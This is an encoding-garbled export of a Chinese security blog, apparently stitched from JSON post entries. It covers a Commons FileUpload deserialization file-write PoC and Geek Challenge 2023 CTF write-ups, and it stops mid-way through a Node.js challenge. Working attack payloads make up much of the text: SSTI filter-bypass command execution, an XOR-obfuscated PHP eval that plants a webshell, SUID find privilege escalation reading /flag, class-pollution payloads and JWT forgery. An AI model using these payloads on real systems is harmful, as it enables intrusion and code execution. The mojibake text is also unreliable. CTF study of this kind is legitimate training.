ä¸­åˆ©ç”¨äº†è¿™ä¸ªç»„ä»¶æ¥ä»»æ„å†™ã€è¯»æ–‡ä»¶æˆ–è€…ç›®å½•ã€‚ä½†æ˜¯å…·ä½“æ˜¯å¯¹æ–‡ä»¶è¿˜æ˜¯ç›®å½•æ“ä½œä¸ FileUpload ä»¥åŠ JDK çš„ç‰ˆæœ¬æœ‰å…³ã€‚ å—ç©ºå­—èŠ‚æˆªæ–­å½±å“çš„JDKç‰ˆæœ¬èŒƒå›´:JDK&lt;1.7.40;FileUpload åœ¨ 1.3.1 ç‰ˆæœ¬ä¸­ï¼Œå®˜æ–¹å¯¹ç©ºå­—èŠ‚æˆªæ–­è¿›è¡Œäº†ä¿®å¤ï¼Œåœ¨ readObject ä¸­ï¼Œåˆ¤æ–­æˆå‘˜å˜é‡ repository æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºçš„æƒ…å†µä¸‹åˆ¤æ–­æ˜¯ä¸æ˜¯ç›®å½•ï¼Œå¹¶åˆ¤æ–­ç›®å½•è·¯å¾„ä¸­æ˜¯å¦åŒ…å« \\0 ç©ºå­—ç¬¦ã€‚ org.apache.commons.fileupload.disk.DiskFileItemç±»çš„readObjectï¼› getOutputStreamæ–¹æ³•ï¼šç”±äºdfosæ— æ³•ååºåˆ—åŒ–(transient)ï¼Œåªèƒ½ä¸ºç©ºï¼›getTempFileæ–¹æ³•è¿”å›ä¸€ä¸ªFileå¯¹è±¡ï¼Œå…¶ä¸­repositoryæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯ç›®å½•æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯æ–‡ä»¶åä¸å¯æ§(ä½ç‰ˆæœ¬å¯ä»¥ç”¨ç©ºå­—ç¬¦ç»•è¿‡ï¼Œä½¿å¾—æ–‡ä»¶åä¹Ÿå¯æ§)ï¼› æœ€ç»ˆè¿”å›ä¸€ä¸ªDeferredFileOutputStreamå¯¹è±¡ï¼›cachedContentå¯ä»¥é€šè¿‡åå°„æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦å†™çš„å†…å®¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»»æ„ç›®å½•å†™ 123456789101112131415161718private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { // read values in.defaultReadObject(); OutputStream output = getOutputStream(); if (cachedContent != null) { output.write(cachedContent); } else { FileInputStream input = new FileInputStream(dfosFile); IOUtils.copy(input, output); dfosFile.delete(); dfosFile = null; } output.close(); cachedContent = null;} 12345678910111213141516171819202122public OutputStream getOutputStream() throws IOException { if (dfos == null) { File outputFile = getTempFile(); dfos = new DeferredFileOutputStream(sizeThreshold, outputFile); } return dfos;}protected File getTempFile() { if (tempFile == null) { File tempDir = repository; if (tempDir == null) { tempDir = new File(System.getProperty(&quot;java.io.tmpdir&quot;)); } String tempFileName = format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId()); tempFile = new File(tempDir, tempFileName); } return tempFile;} writeObject; è¦ä½¿å¾—cachedContentå¯æ§ï¼Œå°±è¦ä½¿å¾—dfos.isInMemory()è¿”å›True; 123456789101112private void writeObject(ObjectOutputStream out) throws IOException { // Read the data if (dfos.isInMemory()) { cachedContent = get(); } else { cachedContent = null; dfosFile = dfos.getFile(); } // write out values out.defaultWriteObject();} å…¶å®ä¹Ÿå°±æ˜¯é€šè¿‡åˆ¤æ–­ written çš„é•¿åº¦å’Œ threshold é˜ˆå€¼é•¿åº¦å¤§å°ï¼Œå¦‚æœå†™å…¥å¤§äºé˜ˆå€¼ï¼Œåˆ™ä¼šè¢«å†™å‡ºåˆ°æ–‡ä»¶ä¸­ï¼Œé‚£å°±ä¸æ˜¯å­˜åœ¨å†…å­˜ä¸­äº† 123456789 public boolean isInMemory() { return !isThresholdExceeded(); }//org.apache.commons.io.output.ThresholdingOutputStreamç±»ä¸‹ public boolean isThresholdExceeded() { return written &gt; threshold; } Poc 12345678910111213141516171819202122232425262728293031323334353637383940package fileupload;import org.apache.commons.fileupload.disk.DiskFileItem;import org.apache.commons.io.output.DeferredFileOutputStream;import java.io.*;import java.lang.reflect.Field;public class Test1 { public static void main(String[] args) throws Exception { byte[] bytes = &quot;zIxyd...&quot;.getBytes(); File repository = new File(&quot;E:/tmp&quot;); DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository); DeferredFileOutputStream deferredFileOutputStream = new DeferredFileOutputStream(0, null); Field dfos = diskFileItem.getClass().getDeclaredField(&quot;dfos&quot;); dfos.setAccessible(true); dfos.set(diskFileItem,deferredFileOutputStream); Field cachedContent = diskFileItem.getClass().getDeclaredField(&quot;cachedContent&quot;); cachedContent.setAccessible(true); cachedContent.set(diskFileItem,bytes); serialize(diskFileItem); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} Wicket1Apache Wicket æŠ„äº† FileUpload çš„ä»£ç ,å°±æ˜¯è¯´åŒ…åä¸åŒï¼Œæ”»å‡»æ‰‹æ³•å’ŒFileUpload1æ˜¯ä¸€æ ·çš„","link":"/2024/03/11/Groovy+Click1+FileUpload1/"},{"title":"Geek Challenge 2023","text":"å‰è¨€è®°å½•ä¸€äº›åœ¨Geek Challenge 2023æ¯”èµ›ä¸­çš„wpï¼›ä¸€éƒ¨åˆ†å†™çš„æ¯”è¾ƒè¯¦ç»†ï¼Œä¸€éƒ¨åˆ†å†™çš„æ¯”è¾ƒç®€å•ï¼Œæ ¹æ®é¢˜ç›®çš„éš¾æ˜“åº¦æ¥çš„ï¼› klf_2æºç å†æ¯”èµ›ä¸­æ˜¯çœ‹ä¸åˆ°æºç çš„ï¼Œæ˜¯æˆ‘åæ¥å¯ä»¥rceåï¼Œcat app.pyå¾—åˆ°æºç çš„ï¼Œä¸ºäº†æ–¹ä¾¿å†™wpï¼Œå°±è´´ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829from flask import Flask, request, render_template, render_template_string,send_from_directoryimport re import os app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): return render_template('index.html') @app.route('/secr3ttt', methods=['GET', 'POST']) def secr3t(): klf = request.args.get('klf', '') template = f''' &lt;html&gt; &lt;body&gt; &lt;h1&gt;åˆ«æ‰¾äº†ï¼Œè¿™æ¬¡ä½ è‚¯å®šæ˜¯klf&lt;/h1&gt; &lt;/body&gt; &lt;img src=&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian- blog/0071088CAC91D2C42C4D31053A7E8D2B731D69.jpg&quot; alt=&quot;g&quot;&gt; &lt;h1&gt;%s&lt;/h1&gt; &lt;/html&gt; &lt;!--klf?--&gt; &lt;!-- åˆ«æƒ³è¦flagï¼Ÿklf --&gt; ''' bl = ['_', '\\\\', '\\'', '&quot;', 'request', &quot;+&quot;, 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr', 'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/', 'flashed', 'os', 'open', 'read', 'count', '*', '38', '124', '47', '59', '99', '100', 'cat', '~', ':', 'not', '0', '-', 'ord', '37', '94', '96', '[',']','index','length']#'43', '45', for i in bl: if i in klf: return render_template('klf.html') a = render_template_string(template % klf) if &quot;{&quot; in a: return a + render_template('win.html') return a @app.route('/robots.txt', methods=['GET']) def robots(): return send_from_directory(os.path.join(app.root_path, 'static'), 'robots.txt', mimetype='text/plain') if __name__ == '__main__': app.run(host='0.0.0.0', port=7889, debug=False é»‘åå•è¿‡æ»¤äº†ä¸€å¤§éƒ¨åˆ†å…³é”®å­—å’Œå…³é”®ç¬¦å·ã€‚ä½†æ˜¯æ²¡æœ‰.ï¼Œjoinè¿‡æ»¤å™¨ï¼Œdictï¼Œ= ï¼Œ()ï¼Œset,|,attr.è¿˜æ˜¯æœ‰æœºå¯ä¹˜çš„ æ„é€ å…³é”®å­—è¿™ä¸€éƒ¨åˆ†å°±æ˜¯æ„é€ å‡ºå…³é”®å­— 1().__class__.__base__.__subclasses__().__getitem__(xx).__init__.__globals__['popen'](xx).read() 12345678910{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%} æ„é€ cmdå†ä¸Šä¸€æ­¥çš„åŸºç¡€ä¸Šï¼Œæ„é€ lsï¼š 123456789101112131415{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set ls=dict(l=a,s=b)|join%}{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(ls)|attr(re)())%}#app.py hahahaha requirements.txt static templates çœ‹åˆ°flagæ²¡æœ‰å†å½“å‰ç›®å½•ä¸‹ï¼Œå°è¯•æ„é€  ls /,è¿™æ—¶å€™å°±éœ€è¦åœ¨ä¸Šä¸€æ­¥çš„åŸºç¡€ä¸Šï¼Œéœ€è¦æ„é€ ç©ºæ ¼å’Œåæ–œæ å­—ç¬¦ ,/, æ„é€ ç©ºæ ¼ç©ºæ ¼å¾ˆå®¹æ˜“æ„é€ ï¼Œåœ¨()|select|string|list)å°±æœ‰è®¸å¤šç©ºæ ¼ï¼Œ,è¿™é‡Œå¤§æ¦‚è§£é‡Šä¸€ä¸‹**()|select|string|list)**è¿™ç§å½¢å¼æ˜¯ä»€ä¹ˆæ„æ€ï¼Œç®¡é“ç¬¦ï¼Œå‰ä¸€ä¸ªè¾“å‡ºå½“ä½œåä¸€ä¸ªè¾“å…¥ï¼Œå°±åƒlist(string(select(()))) æ„é€ åæ–œæ æ€è·¯ä¸€()|select|string|list)ä¸­æ²¡æœ‰åæ–œæ ï¼Œé‚£ä¹ˆå°±æƒ³ä¸€ä¸‹ï¼šè¿˜æœ‰å…¶ä»–å…³é”®å­—å¯ä»¥ä»¥è¿™ç§å½¢å¼æ„é€ å­—ç¬¦å—ï¼Ÿï¼Œè€Œå…¶ä»–å…³é”®å­—æ„é€ çš„å­—ç¬¦ä¸‹å¯èƒ½æœ‰æˆ‘ä»¬éœ€è¦çš„åæ–œæ ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„ è¿˜æœ‰å¾ˆå¤š config|string|list request|string|list lipsum|string|list â€¦â€¦ æ¯”å¦‚configå’Œrequestä¸‹å°±æœ‰åæ–œæ ï¼Œä½†æ˜¯è¢«é»‘åå•äº†ï¼Œæˆ‘è¿™é‡Œæš‚æ—¶è¿˜æ²¡æœ‰æ‰¾åˆ°å…¶ä»–ä¸å¤ªé»‘åå•ä¸‹æœ‰å¯ä»¥æ„é€ åæ–œæ çš„ï¼Œåªèƒ½æ¢æ€è·¯äº† æ€è·¯äºŒåˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²å¾—åˆ°åæ–œæ ï¼Œ 1234{%set fxg=(&quot;%c&quot;%(47))%}{%print(fxg)%}#/ è¦åˆ©ç”¨æ ¼å¼å­—ç¬¦ä¸²éœ€è¦ç”¨åˆ°ç™¾åˆ†å·ï¼Œé‚£ä¹ˆéœ€è¦æ„é€ ç™¾åˆ†å·:å°†å­—ç¬¦urlç¼–ç å–ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦è‚¯å®šæ˜¯%, 1{% set bfh = ()|select|string|urlencode|first %} è€Œç„¶å¹¶æ²¡æœ‰æˆ‘æƒ³çš„é‚£ä¹ˆç®€å•ï¼Œurlå±…ç„¶è¢«è¿‡æ»¤äº†ï¼Œè¿™ç§æ€è·¯åˆæ— æ³•ç”¨äº† æ€è·¯ä¸‰å›é¡¾ä¸€ä¸‹ï¼Œ æˆ‘ä»¬æ˜¯æƒ³è¦å¾—åˆ°åæ–œæ ï¼› æˆ‘ä»¬å·²ç»å¯ä»¥åœ¨å½“å‰ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤äº†ï¼Œä¸Šé¢å±•ç¤ºçš„å°±æœ‰lsï¼› çªç„¶æƒ³èµ·æ¥å½“å‰ç›®å½•æœ‰app.pyæ–‡ä»¶ï¼Œç”¨çš„æ˜¯flaskæ¡†æ¶ï¼Œè‚¯å®šä¼šæœ‰è·¯ç”±ï¼Œæœ‰è·¯ç”±è‚¯å®šä¼šç”¨åˆ°åæ–œæ ;ç°åœ¨æ€è·¯æ¯”è¾ƒç®€å•äº†ï¼šä»app.pyæ–‡ä»¶ä¸­å¾—åˆ°åæ–œæ ï¼› åˆ—å¦‚ä¸‹æ®µflaskä»£ç ä¸­è‚¯å®šä¼šå­˜åœ¨åæ–œæ ï¼š 123@app.route('/', methods=['GET', 'POST']) def index(): return render_template('index.html') éœ€è¦cat app.py,å­—æ¯å’Œç©ºæ ¼éƒ½æœ‰äº†ï¼Œç°åœ¨æ„é€ .åˆæˆäº†ä¸€ä¸ªéš¾ç‚¹ï¼Œä½†è¿˜æ˜¯æœ‰æ–¹æ³•çš„ 12345678{%print(g)%}#&lt;flask.g of 'app'&gt;{% set po=dict(po=a,p=b)|join%} {% set dian=(g|string|list)|attr(po)(6)%}{%print(dian)%}#. okï¼Œè¿™æ ·æ‰€éœ€è¦çš„å­—ç¬¦éƒ½æ„é€ å‡ºæ¥äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯åˆ©ç”¨äº† exp123456789101112131415161718192021222324252627{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{%set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set kon=(()|select|string|list)|attr(po)(17)%} {% set dian=(g|string|list)|attr(po)(6)%} {% set qian=dict(p=a)|join%}{% set hou=dict(p=a,y=b)|join%}{% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%}{% set cmd=(dict(ca=a,t=b)|join,ming)|join()%}{% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% set bb=(a|string|list)|attr(po)(246)%}{% set ho=(dict(ap=a,p=b))|join%}{% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%}{% set cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%}{%print(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)())%} EzRce123456789101112&lt;?phpinclude('waf.php');session_start();show_source(__FILE__);error_reporting(0);$data=$_GET['data'];if(waf($data)){ eval($data);}else{ echo &quot;no!&quot;;}?&gt; å…ˆç”¨bp fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆï¼Œå‘ç°å¼‚æˆ–ç¬¦å·æ²¡æœ‰è¿‡æ»¤ï¼Œè€Œä¸”æœ‰å‡ ä¸ªå­—æ¯æ²¡æœ‰è¿‡æ»¤ ä¸‹é¢æ˜¯ä¸Šäº†æœ¨é©¬æ‰å¾—åˆ°æºç çš„ 12345678910&lt;?phpfunction waf($data){ if(preg_match('/[b-df-km-uw-z0-9\\+\\~\\{\\}]+/i',$data)){ return False; }else{ return True; }} å¼‚æˆ–ä¸ŠğŸå› ä¸ºæ²¡æœ‰è¿‡æ»¤å¼‚æˆ–æ‰€ä»¥æ„é€ phpinfo(); : (â€œ^@^@@[@â€^â€.(.).=/â€œ)(); å‘ç°æ˜¯å¯ä»¥æˆåŠŸæ˜¾ç¤ºphpinfoå†…å®¹ï¼Œä½†æ˜¯æŸ¥çœ‹disable_functionsç¦ç”¨äº†ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ç¦ç”¨file_put_contentså‡½æ•°ï¼Œå°è¯•å†™ä¸€å¥è¯æœ¨é©¬ä¸Šå» 123file_put_content(&quot;lll.php&quot;,&quot;&lt;?php eval($_POST[1])?&gt;&quot;)(&quot;AAAAaL*VaAAAVAAVL&quot;^&quot;'(-$&gt;&lt;_\\&quot;&gt;\\&quot;./\\&quot;$/\\&quot;?&quot;)(&quot;lll&quot;.&quot;.&quot;.(&quot;LAL&quot;^&quot;&lt;)&lt;&quot;),(&quot;aaLALaaAVAAvaalalvelaleaa&quot;^&quot;]^&lt;)&lt;A!$ -^E&gt;&lt;.?\\&quot;&gt;]&lt;E^^_&quot;)); å‘ç°ä¹Ÿæ˜¯æˆåŠŸä¸Šä¼ äº†æœ¨é©¬ï¼Œç”¨èšå‰‘è¿shell(è¿™é‡Œæœ‰ä¸€ä¸ªå‘,httpsæ²¡æœ‰æˆåŠŸï¼Œç”¨httpä»£æ›¿å°±å¯ä»¥äº†) ææƒå¯ä»¥çœ‹åˆ°flagå°±åœ¨æ ¹ç›®å½•ä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»å–ï¼Œwhoami æŸ¥çœ‹å½“å‰ç”¨æˆ·www-dataï¼Œå»ç½‘ä¸Šæœä¸€æ¬¡å…³äºææƒçš„çŸ¥è¯†ï¼Œ ææƒçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œè¿™é“é¢˜è€ƒçš„æ˜¯findææƒï¼Œ 123456789which find #/usr/bin/findls /usr/bin/find -l#-rwsr-xr-x. 1 root root 315904 Feb 16 2019 /usr/bin/find#è¿™é‡Œå‘ç°æœ‰sæƒé™ s:suodsetuidï¼šè¯¥ä½æ˜¯è®©æ™®é€šç”¨æˆ·å¯ä»¥ä»¥rootç”¨æˆ·çš„è§’è‰²è¿è¡Œåªæœ‰rootå¸å·æ‰èƒ½è¿è¡Œçš„ç¨‹åºæˆ–å‘½ä»¤ find /etc/passwd -exec cat /flag \\; #find ä¸€ä¸ªå¿…é¡»å­˜åœ¨çš„æ–‡ä»¶ -exec æœ‰æ‰§è¡Œçš„å‘½ä»¤ \\; åˆ°è¿™é‡Œflagå°±å·²ç»åˆ°æ‰‹äº†ï¼Œè¸©äº†å¾ˆå¤šå‘ï¼Œè¿˜æœ‰ä¸€äº›å‘æ²¡æœ‰å†™ä¸Šäº†ï¼Œä¹Ÿæ˜¯æ‹¿äº†ä¸€ä¸ªä¸‰è¡€ï¼Œä¸‹é¢æ˜¯å¼‚æˆ–çš„è„šæœ¬ 123456789101112131415valid = &quot;alevALEV!@$%^*()[];\\'\\&quot;,.&lt;&gt;/?-=_` &quot;answer = str(input(&quot;è¯·è¾“å…¥è¿›è¡Œå¼‚æˆ–æ„é€ çš„å­—ç¬¦ä¸²ï¼š&quot;))# answer = &quot;//\\/\\/&quot;tmp1, tmp2 = '', ''for c in answer: for i in valid: for j in valid: if (ord(i) ^ ord(j) == ord(c)): tmp1 += i tmp2 += j break else: continue break ezpythonæºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import jsonimport osfrom waf import wafimport importlibfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_stringapp = Flask(__name__)app.secret_key='jjjjggggggreekchallenge202333333'class User(): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot; self.isvip=Falseclass hhh(User): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot;registered_users=[]@app.route('/')def hello_world(): # put application's code here return render_template(&quot;welcome.html&quot;)@app.route('/play')def play(): username=session.get('username') if username: return render_template('index.html',name=username) else: return redirect(url_for('login'))@app.route('/login',methods=['GET','POST'])def login(): if request.method == 'POST': username=request.form.get('username') password=request.form.get('password') user = next((user for user in registered_users if user.username == username and user.password == password), None) if user: session['username'] = user.username session['password']=user.password return redirect(url_for('play')) else: return &quot;Invalid login&quot; return redirect(url_for('play')) return render_template(&quot;login.html&quot;)@app.route('/register',methods=['GET','POST'])def register(): if request.method == 'POST': try: if waf(request.data): return &quot;fuck payload!Hacker!!!&quot; data=json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;è¿ç”¨æˆ·åå¯†ç éƒ½æ²¡æœ‰ä½ æ³¨å†Œå•¥å‘¢&quot; user=hhh() merge(data,user) registered_users.append(user) except Exception as e: return &quot;æ³°é…·è¾£,æ²¡æœ‰æ³¨å†ŒæˆåŠŸæ&quot; return redirect(url_for('login')) else: return render_template(&quot;register.html&quot;)@app.route('/flag',methods=['GET'])def flag(): user = next((user for user in registered_users if user.username ==session['username'] and user.password == session['password']), None) if user: if user.isvip: data=request.args.get('num') if data: if '0' not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: flag = os.environ.get('geek_flag') return render_template('flag.html',flag=flag) else: return &quot;ä½ çš„æ•°å­—ä¸å¯¹å“¦!&quot; else: return &quot;I need a num!!!&quot; else: return render_template_string('è¿™ç§ç¥åŠŸä½ ä¸å……VIPä¹Ÿæƒ³å­¦?&lt;p&gt;&lt;img src=&quot;{{url_for(\\'static\\',filename=\\'weixin.png\\')}}&quot;&gt;è¦ä¸væˆ‘50,æˆ‘é€ä½ ä¸€ä¸ªVIPå§,å˜»å˜»&lt;/p&gt;') else: return &quot;å…ˆç™»å½•å»&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)if __name__ == '__main__': app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;) è€ƒå¯ŸåŸå‹é“¾æ±¡æŸ“å’Œpythonçš„intå‡½æ•°æ¼æ´ï¼Œå…¶å®intä¸æ­¢åœ¨pythoné‡Œæœ‰è¿™ä¸ªæ¼æ´ï¼Œå…¶ä»–è¯­è¨€ä¹Ÿæœ‰ï¼Œæ¯”å¦‚phpä¹Ÿæœ‰ï¼› æ ‡å¿—ç€åŸå‹é“¾æ±¡æŸ“ 1234567891011def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) è™½ç„¶ä»£ç ä¸€å…±æœ‰100å¤šè¡Œï¼Œä½†æ˜¯æ•´ä¸ªä»£ç çš„é€»è¾‘å’Œå®ç°çš„åŠŸèƒ½æ˜¯éå¸¸ç®€å•æ˜“æ‡‚çš„ ä½¿å¾—hhhç±»çš„isvipä¸ºçœŸï¼Œä½†æ˜¯hhhæ²¡æœ‰isvipå±æ€§ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯éœ€è¦æ±¡æŸ“hhhç±»ï¼Œ exampleå…ˆçœ‹ä¸€ä¸ªpythonåŸå‹é“¾æ±¡æŸ“çš„ç®€å•æ¡ˆä¾‹å§ 1234567891011121314151617181920212223242526272829303132333435363738394041class father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret)#hahaprint(instance.secret)#hahamerge(payload, instance)print(son_a.secret)#no wayprint(instance.secret)#no way polluteç„¶åä¸‹é¢æ˜¯æˆ‘è‡ªå·±æœ¬åœ°æµ‹è¯•çš„ç»“æœ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import jsonclass User(): def __init__(self): self.username=&quot;aa&quot; self.password=&quot;bb&quot; self.isvip=0class hhh(User): def __init__(self): self.username=&quot;cc&quot; self.password=&quot;dd&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)user = hhh()#payload = '''{&quot;username&quot;: &quot;test&quot;,&quot;password&quot;: &quot;test002&quot;,&quot;\\u0069\\u0073\\u0076\\u0069\\u0070&quot; : &quot;111&quot;}'''payload = json.loads(payload)print(payload)print(user.username)print(user.password)merge(payload, user)print(user.username)print(user.password)print(user.isvip) è¿™é‡Œç”¨unicodeç¼–ç ç»•è¿‡wafï¼Œjson.loadä¼šè‡ªåŠ¨è¿›è¡Œunicodeè§£ç ï¼Œ ç»•åå°±æ˜¯ç»•è¿‡ 1if '0' not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: è¿™é‡Œæ¯”è¾ƒç®€å•äº†ç”¨ç©ºæ ¼æˆ–è€…å­—ç¬¦â€œ+â€æˆ–è€…0ï¼Œè¿™é‡Œå°†0ç¦æ­¢äº†ç”¨å‰é¢ä¸¤è€…å°±è¡Œï¼Œ 123?=%20123456789æˆ–è€…?=+123456789 é›¨æ ¹æ®hint secret_keyæ˜¯å‡ºé¢˜äººçš„id:VanZY(æˆ‘å½“æ—¶æ²¡çœ‹hintï¼Œç”¨è„šæœ¬ä¹Ÿå¯ä»¥çˆ†ç ´å‡ºæ¥)ï¼Œç„¶åä¼ªé€ jwtï¼Œå¾—åˆ°æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677const express = require('express');const jwt = require('jsonwebtoken');const app = express();const bodyParser = require('body-parser')const path = require('path');const jwt_secret = &quot;VanZY&quot;;const cookieParser = require('cookie-parser');const putil_merge = require(&quot;putil-merge&quot;)app.set('views', './views');app.set('view engine', 'ejs');app.use(cookieParser());app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())var Super = {};var safecode = function (code){ let validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\\+|\\*/ig; return !validInput.test(code);};app.all('/code', (req, res) =&gt; { res.type('html'); if (req.method == &quot;POST&quot; &amp;&amp; req.body) { putil_merge({}, req.body, {deep:true}); } res.send(&quot;welcome to code&quot;);});app.all('/hint', (req, res) =&gt; { res.type('html'); res.send(&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;);});app.get('/source', (req, res) =&gt; { res.type('html'); var auth = req.cookies.auth; jwt.verify(auth, jwt_secret , function(err, decoded) { try{ if(decoded.user==='admin'){ res.sendFile(path.join(__dirname + '/index.js')); }else{ res.send('you are not admin &lt;!--Maybe you can view /hint--&gt;'); } } catch{ res.send(&quot;Fuck you Hacker!!!&quot;) } });});app.all('/create', (req, res) =&gt; { res.type('html'); if (!req.body.name || req.body.name === undefined || req.body.name === null){ res.send(&quot;please input name&quot;); }else { if (Super['userrole'] === 'Superadmin') { res.render('index', req.body); }else { if (!safecode(req.body.name)) { res.send(&quot;ä½ åœ¨åšä»€ä¹ˆï¼Ÿå¿«åœä¸‹ï¼ï¼ï¼&quot;) } else{ res.render('index', {name: req.body.name}); } } }});app.get('/',(req, res) =&gt; { res.type('html'); var token = jwt.sign({'user':'guest'},jwt_secret,{ algorithm: 'HS256' }); res.cookie('auth ',token); res.end('Only admin can get source in /source');});app.listen(3000, () =&gt; console.log('Server started on port 3000')); ä»£ç æ¯”è¾ƒç®€å•ï¼Œä¸€çœ‹å°±æ˜¯éœ€è¦æŸç§æƒé™æ‰èƒ½æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼ŒnodejsåŸå‹é“¾æ±¡æŸ“çš„è€å¥—è·¯äº† 12if (Super['userrole'] === 'Superadmin') { res.render('index', req.body); åœ¨è¿™é‡Œï¼Œéœ€è¦Super[â€˜userroleâ€™]çš„å€¼ä¸ºSuperadminï¼Œä½†æ˜¯æ•´ä¸ªä»£ç 